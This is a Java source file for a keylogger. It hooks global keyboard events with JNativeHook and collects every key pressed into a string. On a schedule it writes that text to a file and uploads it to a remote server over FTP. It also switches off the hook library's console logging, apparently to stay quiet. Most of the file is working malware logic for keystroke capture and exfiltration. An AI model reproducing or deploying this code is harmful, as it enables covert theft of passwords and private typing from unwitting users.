package Main;

import java.util.logging.Logger;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger extends Thread implements NativeKeyListener, FileUploader {
	
	private static String textEntered;
	private FileHandler fileHandler;
	private FTPHandler ftpHandler;
	private Scheduler scheduler;
	
	public KeyLogger() {
		textEntered = new String();
		fileHandler = FileHandler.getInstance();
		ftpHandler = new FTPHandler();
		scheduler = new Scheduler(this);
	}

    public static void main(String[] args) {
    	KeyLogger keyLogger = new KeyLogger();

        keyLogger.initializeKeyListener();
        keyLogger.checkPeriodically();
    }
    
    public void checkPeriodically() {
    	scheduler.checkUploadHour();
    }
    
	@Override
	public void uploadFile() {
		System.out.println("Uploading...");
        createFile();
        transferToFile();
        uploadingFileToServer();
	}
    
    public void createFile() {
    	fileHandler.createNewFile();
    }
    
    public void transferToFile() {
    	fileHandler.writeToFile(textEntered);
    }
    
    public void uploadingFileToServer() {
    	ftpHandler.uploadToServer(fileHandler.getFile());
    }
    
	@Override
	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
		String convertedKey = convertKey(keyPressed);
		textEntered += convertedKey;
	}
	
	public String convertKey(String keyPressed){
		switch(keyPressed) {
			case "Space" :
				keyPressed = " ";
				break;
			case "Period" :
				keyPressed = ".";
				break;
			case "Comma" :
				keyPressed = ",";
				break;
			case "Backspace" :
				keyPressed = "";
				break;
			case "Shift" :
				keyPressed = "";
				break;
			case " Ctrl " :
				keyPressed = "";
				break;
		}
		return keyPressed;
	}
	
    public void initializeKeyListener() {
        try {
            GlobalScreen.registerNativeHook();
        } 
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
        disableConsoleLogger();
    }
	
    public void disableConsoleLogger() {
    	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false); 
    }
    
    public static void wait(int timeInSeconds) {
        try {
			Thread.sleep(timeInSeconds*1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
    }

	@Override
	public void nativeKeyReleased(NativeKeyEvent keyEvent) {}

	@Override
	public void nativeKeyTyped(NativeKeyEvent keyEvent) {}
}



